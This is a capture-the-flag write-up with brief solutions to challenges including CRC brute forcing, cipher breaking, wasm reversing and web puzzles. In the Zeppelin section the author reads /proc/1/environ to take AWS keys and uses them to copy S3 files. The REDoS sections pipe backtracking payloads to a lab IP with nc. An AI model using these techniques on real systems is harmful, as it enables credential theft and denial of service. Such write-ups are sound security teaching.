### Follow the yellow brick road

Most of it was just a bunch of:

```
  curl -v -L --max-redirs 1000 http://some-url/
```

But sometimes I needed to do `nc url port` and type the methods manually.

### Small

I viewed the ZIP file with `mc` and got CRC-32 for 10-byte `flag.txt` file: 0x85777b75

Then I just brute forced everything that fit `flag{....}` pattern to get something that matched the CRC:

```
require 'zlib'
t = 0x8577_7b75
chars = [*'a'..'z', *'A'..'Z', *'0'..'9']
chars.product(chars, chars, chars).map(&:join).select{|x| Zlib::crc32("flag{#{x}}") == t }
```

### 안녕하세요

After some quick statistics check, and a detour for NFD, I went to [monoalphabetic code breaker app I wrote](https://taw.github.io/imba-monoalphabetic/), and started with space, then "the" etc.

After a while I copied the half-decoded code into text file, and finished manually.

### Wasm

I just [disassembled the file using online tool](https://wasdk.github.io/wasmcodeexplorer/).

I got what looked like some constant checking ASCII codes, and array of them.

```
 (elem (i32.const 0) $func5 $func11 $func0 $func6 $func26 $func0 $func18 $func18 $func4 $func12 $func1 $func11 $func4 $func27 $func7 $func7 $func25 $func24 $func27 $func14 $func0 $func25 $func4 $func28 $func29)
  (func $func0 (param $var0 i32) (result i32)
    get_local $var0
    i32.const 97
    i32.eq
  )
  (func $func1 (param $var0 i32) (result i32)
    get_local $var0
    i32.const 98
    i32.eq
  )
  (func $func2 (param $var0 i32) (result i32)
    get_local $var0
    i32.const 99
    i32.eq
  )
  ...
```

I reassembled substituted each `$funcN` with its ASCII code, and decoded the flag.

### Zeppelin

I didn't finish it.

I tried to run Python, but couldn't find any.

I googled some Scala code to run arbitrary processes, and ran `cat /proc/1/environ` to get AWS keys.

I set the keys in my environment, and used S3 CLI tools to get:

```
$ aws s3 ls bc-ctf/zeppelin-ctf-flag-here/
$ aws s3 cp s3://bc-ctf/zeppelin-ctf-flag-here/flag-ciphertext.enc flag-ciphertext.enc
$ aws s3  cp s3://bc-ctf/zeppelin-ctf-flag-here/grant.txt grant.txt
```

I didn't know how to proceed from there.

### Dark

I just opened the link in TOR Browser, and got the answer there.

### REDoS 1/2

I forced excessive backtracking:

```
echo '0-L0Nd/00000222222222222222222222222333333333333333333334444444444444444444440000000000000000000000000000000002255555555555555555555555555555555555555599999999999999999999994523455555555555555522222222222222285345555555555555555555555552220 SecTalkx!' | nc 35.177.74.111 44022
```

### Power

I downloaded local copy of the files, deleted all the anti-debugging code, and got to battery.

The decoding function had just 202 possible states:
* `battery.charging` either `true` or `false`
* `Math.floor(battery.level * 100)` from `0` to `100`

So I just turned that code into a loop, `console.log`ing all the answers.

### REDoS 2/2

The trick was that `\d` also matches Unicode digits. There's a lot of spaces here:

```
echo 'CTF/٥.0.0 (x, L0N,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ,,,,' | nc 35.177.74.111 44023
```
